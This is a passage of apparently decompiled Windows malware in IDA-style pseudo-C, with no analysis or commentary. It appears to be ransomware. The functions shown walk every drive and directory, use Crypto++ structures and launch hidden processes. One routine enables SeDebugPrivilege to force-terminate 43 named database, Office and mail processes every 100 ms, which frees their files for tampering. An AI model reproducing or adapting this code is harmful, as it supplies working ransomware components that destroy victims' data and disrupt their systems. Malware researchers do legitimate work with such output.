  v6 = sub_4027C9(v10, v14, 0x7FFFFFFFu);
  v7 = (void *)std::_Allocate<8,std::_Default_allocate_traits,0>(v6 + 1);
  Src[4] = v5;
  v12 = v7;
  Src[5] = (void *)v6;
  v11 = (size_t)(v13 + 1);
  if ( v14 < 0x10 )
  {
    memmove_0(v7, Src, v11);
  }
  else
  {
    v8 = *Src;
    memmove_0(v7, *Src, v11);
    std::_Deallocate<8,0>(v8, v14 + 1);
  }
  *Src = v12;
  return Src;
}
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (00409AC0) --------------------------------------------------------
void **__thiscall sub_409AC0(int this, int a2, char *Src, size_t Size)
{
  int v4; // edx
  unsigned int v5; // edi
  bool v6; // cf
  char *v7; // esi
  size_t v8; // ebx
  size_t v10; // [esp-4h] [ebp-Ch]

  v4 = *(_DWORD *)(this + 16);
  v5 = Size;
  if ( Size > *(_DWORD *)(this + 20) - v4 )
  {
    v10 = Size;
    LOBYTE(Size) = 0;
    return sub_409CB2((void **)this, v5, Size, this, Src, v10);
  }
  else
  {
    v6 = *(_DWORD *)(this + 20) < 0x10u;
    *(_DWORD *)(this + 16) = v4 + Size;
    v7 = (char *)this;
    if ( !v6 )
      v7 = *(char **)this;
    if ( &Src[Size] <= v7 || Src > &v7[v4] )
    {
      v8 = Size;
    }
    else if ( v7 > Src )
    {
      v8 = v7 - Src;
    }
    else
    {
      v8 = 0;
    }
    memmove(&v7[Size], v7, v4 + 1);
    memmove_0(v7, Src, v8);
    memmove_0(&v7[v8], &Src[v8 + Size], Size - v8);
    return (void **)this;
  }
}

//----- (00409B59) --------------------------------------------------------
int __thiscall sub_409B59(int this, int a2, int a3, char a4)
{
  _DWORD *v5; // edi
  int v6; // edx
  int result; // eax
  _DWORD *Block; // [esp+Ch] [ebp-14h]

  Block = operator new(0x2Cu);
  v5 = sub_409DB8(Block, a2, a3, a4);
  v6 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  sub_4096AA(v5 + 3, v6);
  sub_4096AA((_DWORD *)(this + 4), (int)v5);
  result = this;
  *(_BYTE *)(this + 8) = a4;
  return result;
}

//----- (00409BCC) --------------------------------------------------------
int __thiscall sub_409BCC(int this, int a2, _DWORD *a3, char a4)
{
  _DWORD *v5; // edi
  int v6; // edx
  int result; // eax
  _DWORD *v8; // [esp+Ch] [ebp-14h]

  v8 = operator new(0x14u);
  v5 = sub_409E02(v8, a2, a3, a4);
  v6 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  sub_4096AA(v5 + 3, v6);
  sub_4096AA((_DWORD *)(this + 4), (int)v5);
  result = this;
  *(_BYTE *)(this + 8) = a4;
  return result;
}

//----- (00409C38) --------------------------------------------------------
int __thiscall sub_409C38(int this, int a2, _DWORD *a3, char a4)
{
  _DWORD *v5; // edi
  int result; // eax
  int v7; // [esp-4h] [ebp-24h]

  v5 = operator new(0x14u);
  v5[1] = a2;
  *((_BYTE *)v5 + 8) = a4;
  *((_BYTE *)v5 + 9) = 0;
  v5[3] = 0;
  *v5 = &CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';
  v5[4] = *a3;
  v7 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  sub_4096AA(v5 + 3, v7);
  sub_4096AA((_DWORD *)(this + 4), (int)v5);
  result = this;
  *(_BYTE *)(this + 8) = a4;
  return result;
}
// 46DB64: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';

//----- (00409CB2) --------------------------------------------------------
void **__thiscall sub_409CB2(void **Src, unsigned int a2, int a3, int a4, void *Srca, size_t Size)
{
  char *v7; // ecx
  char *v8; // edi
  unsigned int v9; // esi
  char *v10; // eax
  size_t v11; // edi
  char *v12; // esi
  void *v13; // esi
  int v15; // [esp-Ch] [ebp-20h]
  char *v17; // [esp+Ch] [ebp-8h]
  char *v18; // [esp+10h] [ebp-4h]
  unsigned int v19; // [esp+1Ch] [ebp+8h]
  char *Sizea; // [esp+2Ch] [ebp+18h]

  v7 = (char *)Src[4];
  v18 = v7;
  if ( 0x7FFFFFFF - (int)v7 < a2 )
    sub_40278D();
  v8 = &v7[a2];
  v15 = (int)&v7[a2];
  v19 = (unsigned int)Src[5];
  v9 = sub_4027C9(v15, v19, 0x7FFFFFFFu);
  v10 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(v9 + 1);
  Src[4] = v8;
  Src[5] = (void *)v9;
  v11 = (size_t)(v18 + 1);
  v12 = &v10[Size];
  v17 = v10;
  Sizea = &v10[Size];
  if ( v19 < 0x10 )
  {
    memmove_0(v10, Srca, Size);
    memmove_0(v12, Src, v11);
  }
  else
  {
    v13 = *Src;
    memmove_0(v10, Srca, Size);
    memmove_0(Sizea, v13, v11);
    std::_Deallocate<8,0>(v13, v19 + 1);
  }
  *Src = v17;
  return Src;
}
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (00409D57) --------------------------------------------------------
_DWORD *__thiscall sub_409D57(void *this, _DWORD *a2)
{
  return sub_409E2D(a2, (int)this);
}

//----- (00409D67) --------------------------------------------------------
char __thiscall sub_409D67(int *this, void *Src, char *a3, int *a4)
{
  int v5; // eax

  if ( __std_type_info_compare(&dword_49062C, &dword_490750)
    || (LOBYTE(v5) = sub_40F4DF(a3, (int)a4, this + 4), !(_BYTE)v5) )
  {
    sub_406577(Src, (char *)&int const * `RTTI Type Descriptor', (int)a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 44416A: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 490628: using guessed type const int *int const * `RTTI Type Descriptor';
// 49062C: using guessed type int dword_49062C;
// 490750: using guessed type int dword_490750;

//----- (00409DB8) --------------------------------------------------------
_DWORD *__thiscall sub_409DB8(_DWORD *this, int a2, int a3, char a4)
{
  this[1] = a2;
  *((_BYTE *)this + 8) = a4;
  *((_BYTE *)this + 9) = 0;
  this[3] = 0;
  *this = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';
  sub_408DC8(this + 4, a3);
  return this;
}
// 46C644: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';

//----- (00409E02) --------------------------------------------------------
_DWORD *__thiscall sub_409E02(_DWORD *this, int a2, _DWORD *a3, char a4)
{
  this[3] = 0;
  this[1] = a2;
  *((_BYTE *)this + 8) = a4;
  *((_BYTE *)this + 9) = 0;
  *this = &CryptoPP::AlgorithmParametersTemplate<int>::`vftable';
  this[4] = *a3;
  return this;
}
// 46C634: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int>::`vftable';

//----- (00409E2D) --------------------------------------------------------
_DWORD *__thiscall sub_409E2D(_DWORD *this, int a2)
{
  sub_406BFD(this, a2);
  *this = &CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';
  this[4] = *(_DWORD *)(a2 + 16);
  return this;
}
// 46DB64: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';

//----- (00409E55) --------------------------------------------------------
_DWORD *__thiscall sub_409E55(_DWORD *this, char a2)
{
  return sub_408E90(this - 1, a2);
}

//----- (00409E5D) --------------------------------------------------------
int __thiscall sub_409E5D(_DWORD *this)
{
  return sub_408403(this - 12);
}

//----- (00409E65) --------------------------------------------------------
_DWORD *__thiscall sub_409E65(_DWORD *this, char a2)
{
  return sub_40701C(this - 1, a2);
}

//----- (00409E6D) --------------------------------------------------------
void *__thiscall sub_409E6D(char *this, char a2)
{
  return sub_408B17(this - 4, a2);
}

//----- (00409E75) --------------------------------------------------------
_DWORD *__thiscall sub_409E75(_DWORD *this, char a2)
{
  return sub_408E90(this - 2, a2);
}

//----- (00409E7D) --------------------------------------------------------
void *__thiscall sub_409E7D(char *this, char a2)
{
  return sub_4072B2(this - 4, a2);
}

//----- (00409E8D) --------------------------------------------------------
_DWORD *__thiscall sub_409E8D(_DWORD *this, char a2)
{
  return sub_407167(this - 2, a2);
}

//----- (00409E95) --------------------------------------------------------
void *__thiscall sub_409E95(char *this, char a2)
{
  return sub_406E6D(this - 4, a2);
}

//----- (00409E9D) --------------------------------------------------------
_DWORD *__thiscall sub_409E9D(_DWORD *this, char a2)
{
  return sub_408EBE(this - 15, a2);
}

//----- (00409EA5) --------------------------------------------------------
_DWORD *__thiscall sub_409EA5(_DWORD *this, char a2)
{
  return sub_408D3C(this - 1, a2);
}

//----- (00409EAD) --------------------------------------------------------
int __thiscall sub_409EAD(_DWORD *this)
{
  return sub_40840F(this - 12);
}

//----- (00409EB5) --------------------------------------------------------
_DWORD *__thiscall sub_409EB5(_DWORD *this, char a2)
{
  return sub_408EBE(this - 1, a2);
}

//----- (00409EBF) --------------------------------------------------------
void __thiscall sub_409EBF(_DWORD *this, WCHAR *lpString)
{
  int v4; // eax
  HANDLE FirstFile; // ebx
  bool v6; // zf
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int lpStringa; // [esp+10h] [ebp+8h]

  if ( lpString )
  {
    v4 = lstrlenW(lpString);
    lpString[v4] = 42;
    lpStringa = v4;
    lpString[v4 + 1] = 0;
    FirstFile = FindFirstFileExW(lpString, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, 0, 2u);
    lpString[lpStringa] = 0;
    if ( FirstFile != (HANDLE)-1 || (FirstFile = FindFirstFileW(lpString, &FindFileData), FirstFile != (HANDLE)-1) )
    {
      while ( 1 )
      {
        if ( !lstrcmpW(FindFileData.cFileName, &word_47F184) || !lstrcmpW(FindFileData.cFileName, L"..") )
          goto LABEL_18;
        if ( (FindFileData.dwFileAttributes & 0x410) == 16 )
        {
          if ( (unsigned int)(lpStringa + lstrlenW(FindFileData.cFileName)) < 0x104 )
          {
            v6 = (this[6] & 2) == 0;
            this[6] &= 2u;
            if ( !v6 )
            {
              lstrcatW(lpString, FindFileData.cFileName);
              v7 = this[7];
              if ( v7 && (*(unsigned __int8 (__thiscall **)(int, WCHAR *))(*(_DWORD *)v7 + 16))(v7, lpString) )
                goto LABEL_18;
              lstrcatW(lpString, &word_47EA8C);
              sub_409EBF(lpString);
            }
          }
        }
        else if ( (FindFileData.dwFileAttributes & 4) == 0 )
        {
          v8 = this[8];
          if ( v8 && (*(unsigned __int8 (__thiscall **)(int, WCHAR *))(*(_DWORD *)v8 + 16))(v8, FindFileData.cFileName) )
            goto LABEL_18;
          v9 = this[9];
          if ( v9 )
            (*(void (__thiscall **)(int, WCHAR *, WCHAR *))(*(_DWORD *)v9 + 12))(v9, lpString, FindFileData.cFileName);
        }
        lpString[lpStringa] = 0;
LABEL_18:
        if ( !FindNextFileW(FirstFile, &FindFileData) )
        {
          FindClose(FirstFile);
          return;
        }
      }
    }
  }
}

//----- (0040A00B) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  int v4; // edi
  int result; // eax

  InitializeCriticalSection(&CriticalSection);
  sub_403D77(v4, (int)&CriticalSection);
  DeleteCriticalSection(&CriticalSection);
  return result;
}
// 40A018: variable 'v4' is possibly undefined

//----- (0040A028) --------------------------------------------------------
int __thiscall sub_40A028(DWORD dwProcessId)
{
  HANDLE v1; // edi
  HANDLE CurrentThread; // eax
  HANDLE CurrentProcess; // eax
  DWORD LastError; // esi
  struct _OSVERSIONINFOW VersionInformation; // [esp+Ch] [ebp-140h] BYREF
  struct _TOKEN_PRIVILEGES PreviousState; // [esp+120h] [ebp-2Ch] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+130h] [ebp-1Ch] BYREF
  DWORD dwProcessIda; // [esp+140h] [ebp-Ch]
  DWORD ReturnLength; // [esp+144h] [ebp-8h] BYREF
  HANDLE TokenHandle; // [esp+148h] [ebp-4h] BYREF

  dwProcessIda = dwProcessId;
  v1 = OpenProcess(1u, 0, dwProcessId);
  if ( !v1 )
  {
    if ( GetLastError() != 5 )
      return 0;
    VersionInformation.dwOSVersionInfoSize = 276;
    GetVersionExW(&VersionInformation);
    if ( VersionInformation.dwPlatformId != 2 )
    {
LABEL_4:
      SetLastError(5u);
      return 0;
    }
    ReturnLength = 16;
    CurrentThread = GetCurrentThread();
    if ( !OpenThreadToken(CurrentThread, 0x28u, 0, &TokenHandle) )
    {
      if ( GetLastError() != 1008 )
        return 0;
      CurrentProcess = GetCurrentProcess();
      if ( !OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle) )
        return 0;
    }
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = 2;
    LookupPrivilegeValueW(0, L"SeDebugPrivilege", &NewState.Privileges[0].Luid);
    if ( !AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, &PreviousState, &ReturnLength) )
    {
      LastError = GetLastError();
      CloseHandle(TokenHandle);
LABEL_11:
      SetLastError(LastError);
      return 0;
    }
    if ( GetLastError() == 1300 )
    {
      CloseHandle(TokenHandle);
      goto LABEL_4;
    }
    v1 = OpenProcess(1u, 0, dwProcessIda);
    GetLastError();
    AdjustTokenPrivileges(TokenHandle, 0, &PreviousState, 0x10u, 0, 0);
    CloseHandle(TokenHandle);
    if ( !v1 )
    {
      SetLastError(0);
      return 0;
    }
  }
  if ( !TerminateProcess(v1, 0xFFFFFFFF) )
  {
    LastError = GetLastError();
    CloseHandle(v1);
    goto LABEL_11;
  }
  CloseHandle(v1);
  return 1;
}

//----- (0040A189) --------------------------------------------------------
BOOL sub_40A189()
{
  HANDLE Toolhelp32Snapshot; // edi
  unsigned int i; // esi
  PROCESSENTRY32W pe; // [esp+8h] [ebp-2D8h] BYREF
  LPCWSTR lpString2[43]; // [esp+234h] [ebp-ACh]

  lpString2[0] = L"SearchIndexer.exesqlservr.exe";
  lpString2[1] = L"msftesql.exe";
  lpString2[2] = L"sqlagent.exe";
  lpString2[3] = L"sqlwriter.exe";
  lpString2[4] = L"oracle.exe";
  lpString2[5] = L"ocssd.exe";
  lpString2[6] = L"dbsnmp.exe";
  lpString2[7] = L"synctime.exe";
  lpString2[8] = L"mydesktopqos.exe";
  lpString2[9] = L"agntsvc.exe";
  lpString2[10] = L"isqlpplussvc.exe";
  lpString2[11] = L"isqlpussvc.exe";
  lpString2[12] = L"xfssvccon.exe";
  lpString2[13] = L"mydesktopservice.exe";
  lpString2[14] = L"ocautoupds.exe";
  lpString2[15] = L"encsvc.exe";
  lpString2[16] = L"firefoxconfig.exe";
  lpString2[17] = L"tbirdconfig.exe";
  lpString2[18] = L"ocomm.exe";
  lpString2[19] = L"mysqld.exe";
  lpString2[20] = L"mysqld-nt";
  lpString2[21] = L"mysqld-opt";
  lpString2[22] = L"dbeng50.exe";
  lpString2[23] = L"sqbcoreservice.exe";
  lpString2[24] = L"excel.exe";
  lpString2[25] = L"infopath.exe";
  lpString2[26] = L"msaccess.exe";
  lpString2[27] = L"mspub.exe";
  lpString2[28] = L"onenote.exe";
  lpString2[29] = L"outlook.exe";
  lpString2[30] = L"powerpnt.exe";
  lpString2[31] = L"stream.exe";
  lpString2[32] = L"thebat.exe";
  lpString2[33] = L"thebat64.exe";
  lpString2[34] = L"Thunderbird.exe";
  lpString2[35] = L"visio.exe";
  lpString2[36] = L"winword.exe";
  lpString2[37] = L"wordpad.exe";
  lpString2[38] = L"sqlwb.exe";
  lpString2[39] = L"sqlbrowser.exe";
  lpString2[40] = L"agntsvcagntsvc.exe";
  lpString2[41] = L"agntsvcencsvc.exe";
  lpString2[42] = L"agntsvcisqlplussvc.exe";
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  memset(&pe.cntUsage, 0, 0x228u);
  pe.dwSize = 556;
  Process32FirstW(Toolhelp32Snapshot, &pe);
  do
  {
    for ( i = 0; i < 0x2B; ++i )
    {
      if ( !lstrcmpiW(pe.szExeFile, lpString2[i]) )
        sub_40A028(pe.th32ProcessID);
    }
  }
  while ( Process32NextW(Toolhelp32Snapshot, &pe) );
  return CloseHandle(Toolhelp32Snapshot);
}
// 47F1B4: using guessed type wchar_t aSearchindexerE[30];
// 47F1F0: using guessed type wchar_t aMsftesqlExe[13];
// 47F20C: using guessed type wchar_t aSqlagentExe[13];
// 47F228: using guessed type wchar_t aSqlwriterExe[14];
// 47F244: using guessed type wchar_t aOracleExe[11];
// 47F25C: using guessed type wchar_t aOcssdExe[10];
// 47F270: using guessed type wchar_t aDbsnmpExe[11];
// 47F288: using guessed type wchar_t aSynctimeExe[13];
// 47F2A4: using guessed type wchar_t aMydesktopqosEx[17];
// 47F2C8: using guessed type wchar_t aAgntsvcExe[12];
// 47F2E0: using guessed type wchar_t aIsqlpplussvcEx[17];
// 47F304: using guessed type wchar_t aIsqlpussvcExe[15];
// 47F324: using guessed type wchar_t aXfssvcconExe[14];
// 47F340: using guessed type wchar_t aMydesktopservi[21];
// 47F36C: using guessed type wchar_t aOcautoupdsExe[15];
// 47F38C: using guessed type wchar_t aEncsvcExe[11];
// 47F3A4: using guessed type wchar_t aFirefoxconfigE[18];
// 47F3C8: using guessed type wchar_t aTbirdconfigExe[16];
// 47F3E8: using guessed type wchar_t aOcommExe[10];
// 47F3FC: using guessed type wchar_t aMysqldExe[11];
// 47F414: using guessed type wchar_t aMysqldNt[10];
// 47F428: using guessed type wchar_t aMysqldOpt[11];
// 47F440: using guessed type wchar_t aDbeng50Exe[12];
// 47F458: using guessed type wchar_t aSqbcoreservice[19];
// 47F480: using guessed type wchar_t aExcelExe[10];
// 47F494: using guessed type wchar_t aInfopathExe[13];
// 47F4B0: using guessed type wchar_t aMsaccessExe[13];
// 47F4CC: using guessed type wchar_t aMspubExe[10];
// 47F4E0: using guessed type wchar_t aOnenoteExe[12];
// 47F4F8: using guessed type wchar_t aOutlookExe[12];
// 47F510: using guessed type wchar_t aPowerpntExe[13];
// 47F52C: using guessed type wchar_t aStreamExe[11];
// 47F544: using guessed type wchar_t aThebatExe[11];
// 47F55C: using guessed type wchar_t aThebat64Exe[13];
// 47F578: using guessed type wchar_t aThunderbirdExe[16];
// 47F598: using guessed type wchar_t aVisioExe[10];
// 47F5AC: using guessed type wchar_t aWinwordExe[12];
// 47F5C4: using guessed type wchar_t aWordpadExe[12];
// 47F5DC: using guessed type wchar_t aSqlwbExe[10];
// 47F5F0: using guessed type wchar_t aSqlbrowserExe[15];
// 47F610: using guessed type wchar_t aAgntsvcagntsvc[19];
// 47F638: using guessed type wchar_t aAgntsvcencsvcE[18];
// 47F65C: using guessed type wchar_t aAgntsvcisqlplu[23];

//----- (0040A364) --------------------------------------------------------
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  HANDLE CurrentThread; // eax

  while ( 1 )
  {
    CurrentThread = GetCurrentThread();
    WaitForSingleObject(CurrentThread, 0x64u);
    sub_40A189();
  }
}

//----- (0040A37A) --------------------------------------------------------
BOOL __thiscall sub_40A37A(LPWSTR lpCommandLine)
{
  struct _STARTUPINFOW StartupInfo; // [esp+Ch] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+50h] [ebp-10h] BYREF

  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 68;
  StartupInfo.wShowWindow = 0;
  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  StartupInfo.dwFlags = 1;
  return CreateProcessW(0, lpCommandLine, 0, 0, 1, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);
}

//----- (0040A3CD) --------------------------------------------------------
int __fastcall sub_40A3CD(LPCWSTR lpName, WCHAR *lpBuffer)
{
  WCHAR *v4; // eax
  int EnvironmentVariableW; // esi

  std::wstring::resize(0xFFFF, 0);
  v4 = lpBuffer;
  if ( *((_DWORD *)lpBuffer + 5) >= 8u )
    v4 = *(WCHAR **)lpBuffer;
  EnvironmentVariableW = GetEnvironmentVariableW(lpName, v4, 0xFFFFu);
  std::wstring::resize(EnvironmentVariableW, 0);
  return EnvironmentVariableW;
}

//----- (0040A416) --------------------------------------------------------
_DWORD *__fastcall sub_40A416(_DWORD *a1, unsigned int a2)
{
  size_t v3; // ebx
  void *v4; // eax
  void *v5; // esi

  v3 = (unsigned __int64)a2 >> 31 != 0 ? -1 : 2 * a2;
  v4 = (void *)unknown_libname_45(v3);
  v5 = v4;
  if ( v4 )
    memset(v4, 0, v3);
  else
    v5 = 0;
  *a1 = v5;
  return a1;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0040A458) --------------------------------------------------------
char __thiscall sub_40A458(int *this)
{
  unsigned int LogicalDriveStringsW; // eax
  DWORD v2; // ebx
  WCHAR **v4; // eax
  WCHAR *v5; // esi
  DWORD v6; // eax
  DWORD v7; // edi
  char v8; // bl
  int v9; // ecx
  int v10; // eax
  char v11[24]; // [esp+8h] [ebp-38h] BYREF
  WCHAR *v12; // [esp+20h] [ebp-20h]
  int v13; // [esp+24h] [ebp-1Ch]
  int *v14; // [esp+28h] [ebp-18h]
  int v15; // [esp+2Ch] [ebp-14h]
  void *Block; // [esp+30h] [ebp-10h] BYREF
  int v17; // [esp+3Ch] [ebp-4h]

  v14 = this;
  LogicalDriveStringsW = GetLogicalDriveStringsW(0, 0);
  v2 = LogicalDriveStringsW;
  if ( !LogicalDriveStringsW )
    return 0;
  v4 = (WCHAR **)sub_40A416(&Block, LogicalDriveStringsW);
  v5 = *v4;
  *v4 = 0;
  v12 = v5;
  v17 = 0;
  if ( Block )
    j_j_j___free_base(Block);
  v6 = GetLogicalDriveStringsW(v2, v5);
  v7 = v6;
  if ( v6 && v6 <= v2 )
  {
    v8 = 1;
    v9 = 2;
    v10 = 0;
    v15 = 2;
    do
    {
      if ( !*(WCHAR *)((char *)v5 + v9 - 2) )
      {
        v13 = v9;
        sub_401C9F((int)v11, (char *)v5 + v10);
        LOBYTE(v17) = 1;
        sub_407A35(v14, (int)v11);
        LOBYTE(v17) = 0;
        unknown_libname_3(v11);
        v9 = v15;
        v10 = v13;
      }
      v9 += 2;
      v15 = v9;
      --v7;
    }
    while ( v7 );
  }
  else
  {
    v8 = 0;
  }
  if ( v5 )
    j_j_j___free_base(v5);
  return v8;
}
// 40A4BB: conditional instruction was optimized away because eax.4!=0
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);

//----- (0040A52A) --------------------------------------------------------
_DWORD *__thiscall sub_40A52A(_DWORD *this)
{
  _DWORD *v2; // edi
  int i; // ebx
  int v4; // eax
  _DWORD v6[6]; // [esp+Ch] [ebp-50h] BYREF
  void *v7[6]; // [esp+24h] [ebp-38h] BYREF
  void *Src; // [esp+3Ch] [ebp-20h] BYREF
  int v9; // [esp+40h] [ebp-1Ch]
  int v10; // [esp+44h] [ebp-18h]
  _DWORD *v11; // [esp+48h] [ebp-14h]
  int v12; // [esp+4Ch] [ebp-10h]
  int v13; // [esp+58h] [ebp-4h]

  v11 = this;
  v12 = 0;
  Src = 0;
  v9 = 0;
  v10 = 0;
  v13 = 1;
  sub_40A458((int *)&Src);
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  v2 = Src;
  v12 = 1;
  for ( i = (v9 - (int)Src) / 24; i; --i )
  {
    v6[4] = 0;
    v6[5] = 0;
    sub_401EE0(v6, v2);
    LOBYTE(v13) = 2;
    v7[4] = 0;
    v7[5] = 0;
    sub_401EE0(v7, v6);
    unknown_libname_3(v6);
    LOBYTE(v13) = 3;
    v4 = this[1];
    if ( v4 == this[2] )
    {
      sub_40A60A(this, (char *)v4, v7);
    }
    else
    {
      *(_DWORD *)(v4 + 16) = 0;
      *(_DWORD *)(v4 + 20) = 0;
      sub_401EE0((_DWORD *)v4, v7);
      this[1] += 24;
    }
    LOBYTE(v13) = 1;
    unknown_libname_3(v7);
    v2 += 6;
  }
  sub_401CF5(&Src);
  return this;
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);

//----- (0040A60A) --------------------------------------------------------
char *__thiscall sub_40A60A(_DWORD *this, char *a2, _DWORD *Src)
{
  int v4; // edi
  int v5; // eax
  int v6; // edx
  unsigned int v7; // ebx
  unsigned int v8; // eax
  unsigned int v9; // eax
  char *v10; // ebx
  char *v11; // eax
  int v12; // edx
  char *v13; // ecx
  _DWORD *v14; // eax
  char *v15; // edi
  int v16; // eax
  _DWORD v18[4]; // [esp+0h] [ebp-44h] BYREF
  char *v19; // [esp+10h] [ebp-34h]
  _DWORD *v20; // [esp+14h] [ebp-30h]
  void *Block; // [esp+18h] [ebp-2Ch]
  int v22; // [esp+1Ch] [ebp-28h]
  int v23; // [esp+20h] [ebp-24h]
  int v24; // [esp+24h] [ebp-20h]
  char *v25; // [esp+28h] [ebp-1Ch]
  int v26; // [esp+2Ch] [ebp-18h]
  char *v27; // [esp+30h] [ebp-14h]
  _DWORD *v28; // [esp+34h] [ebp-10h]
  int v29; // [esp+40h] [ebp-4h]
  char *v30; // [esp+4Ch] [ebp+8h]
  char *Srca; // [esp+50h] [ebp+Ch]

  v28 = v18;
  v4 = (int)&a2[-*this] / 24;
  v5 = (this[1] - *this) / 24;
  v6 = (this[1] - *this) % 24;
  v22 = v5;
  if ( v5 == 178956970 )
    sub_402682(24, v6);
  v7 = v5 + 1;
  v8 = (this[2] - *this) / 24;
  if ( v8 <= 178956970 - (v8 >> 1) )
  {
    v9 = (v8 >> 1) + v8;
    if ( v9 < v7 )
      v9 = v7;
    v26 = v9;
  }
  else
  {
    v9 = v7;
    v26 = v7;
  }
  if ( v9 > 0xAAAAAAA )
    sub_4016A7();
  v10 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(24 * v9);
  Block = v10;
  v29 = 0;
  v11 = &v10[24 * v4];
  v25 = v11;
  *((_DWORD *)v11 + 4) = 0;
  v24 = (int)(v11 + 24);
  v27 = v11 + 24;
  *((_DWORD *)v11 + 5) = 0;
  sub_401EE0(v11, Src);
  v12 = this[1];
  v13 = (char *)*this;
  v27 = v25;
  v23 = v12;
  Srca = v13;
  if ( a2 == (char *)v12 )
  {
    v14 = v10;
    v18[3] = v10;
    v19 = v10;
    v20 = this;
    LOBYTE(v29) = 1;
    while ( v13 != (char *)v12 )
    {
      v14[4] = 0;
      v14[5] = 0;
      sub_401EE0(v14, v13);
      v14 = v19 + 24;
      v13 = Srca + 24;
      v12 = v23;
      v19 += 24;
      Srca += 24;
    }
  }
  else
  {
    sub_40A7AA(v13, a2, v10);
    v27 = v10;
    sub_40A7AA(a2, (char *)this[1], (_DWORD *)v24);
  }
  v15 = (char *)*this;
  if ( *this )
  {
    v30 = (char *)this[1];
    if ( v15 != v30 )
    {
      do
      {
        unknown_libname_3(v15);
        v15 += 24;
      }
      while ( v15 != v30 );
      v15 = (char *)*this;
    }
    std::_Deallocate<8,0>(v15, 24 * ((this[2] - (int)v15) / 24));
  }
  v16 = 24 * (v22 + 1);
  *this = v10;
  this[1] = &v10[v16];
  this[2] = &v10[24 * v26];
  return v25;
}
// 4016A7: using guessed type void __noreturn sub_4016A7(void);
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (0040A7AA) --------------------------------------------------------
_DWORD *__stdcall sub_40A7AA(char *Src, char *a2, _DWORD *a3)
{
  while ( Src != a2 )
  {
    a3[4] = 0;
    a3[5] = 0;
    sub_401EE0(a3, Src);
    a3 += 6;
    Src += 24;
  }
  return a3;
}

//----- (0040A80C) --------------------------------------------------------
char __thiscall sub_40A80C(int this, int a2)
{
  HGLOBAL Resource; // eax
  _BYTE *v4; // edi
  DWORD v5; // eax

  if ( !*(_DWORD *)(this + 4) )
    return 0;
  Resource = LoadResource(*(HMODULE *)this, *(HRSRC *)(this + 4));
  if ( !Resource )
    return 0;
  v4 = LockResource(Resource);
  if ( !v4 )
    return 0;
  v5 = SizeofResource(*(HMODULE *)this, *(HRSRC *)(this + 4));
  sub_402A03((void **)a2, *(char **)(a2 + 4), v4, &v4[v5], a2);
  return 1;
}

//----- (0040A85E) --------------------------------------------------------
bool __thiscall sub_40A85E(HANDLE *this, DWORD dwMoveMethod)
{
  return SetFilePointerEx(*this, 0i64, 0, dwMoveMethod);
}

//----- (0040A887) --------------------------------------------------------
bool __thiscall sub_40A887(HANDLE *this, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesWritten = 0;
  return WriteFile(*this, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
}

//----- (0040A8AC) --------------------------------------------------------
bool __thiscall sub_40A8AC(HANDLE *this, LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesRead = 0;
  return !ReadFile(*this, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) || NumberOfBytesRead;
}

//----- (0040A8EA) --------------------------------------------------------
BOOL __cdecl sub_40A8EA(int a1, int a2)
{
  return (((*(_DWORD *)(a1 + 4) - *(_DWORD *)a1) ^ (*(_DWORD *)(a2 + 4) - *(_DWORD *)a2)) & 0xFFFFFFFC) == 0
      && !memcmp(*(const void **)a1, *(const void **)a2, *(_DWORD *)(a1 + 4) - *(_DWORD *)a1);
}

//----- (0040A926) --------------------------------------------------------
unsigned int __cdecl sub_40A926(_DWORD *a1)
{
  unsigned int v2; // esi
  unsigned int v3; // edx

  if ( !*a1 )
    return 0;
  v2 = 0;
  v3 = 32;
  do
  {
    if ( *a1 >> ((v3 + v2) >> 1) )
      v2 = (v3 + v2) >> 1;
    else
      v3 = (v3 + v2) >> 1;
  }
  while ( v3 - v2 > 1 );
  return v3;
}

//----- (0040A95A) --------------------------------------------------------
